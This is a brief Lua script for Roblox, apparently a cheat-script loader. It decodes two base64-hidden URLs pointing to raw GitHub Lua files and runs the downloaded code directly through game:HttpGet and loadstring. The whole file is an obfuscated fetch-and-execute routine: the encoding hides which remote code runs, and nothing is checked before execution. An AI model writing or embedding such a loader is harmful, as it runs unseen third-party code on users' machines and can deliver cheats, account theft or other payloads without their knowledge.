local b64decode = function(s)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    s = s:gsub('[^'..b..'=]', '')
    return (s:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do
            r = r .. ((f % 2^i - f % 2^(i-1) > 0) and '1' or '0')
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i=1,8 do
            c = c + ((x:sub(i,i) == '1') and 2^(8-i) or 0)
        end
        return string.char(c)
    end))
end

local urls = {
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3l1dW5paS0xL1NjcmlwdC9yZWZzL2hlYWRzL21haW4vVGVzdEd1aTIubHVh",
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0x1bm9yaHViYi9MdW5vci1kZXYvcmVmcy9oZWFkcy9tYWluL2xvYWRlci5sdWE="
}

for _, encoded in next, urls do
    task.spawn(function()
        loadstring(game:HttpGet(b64decode(encoded)))()
    end)
end
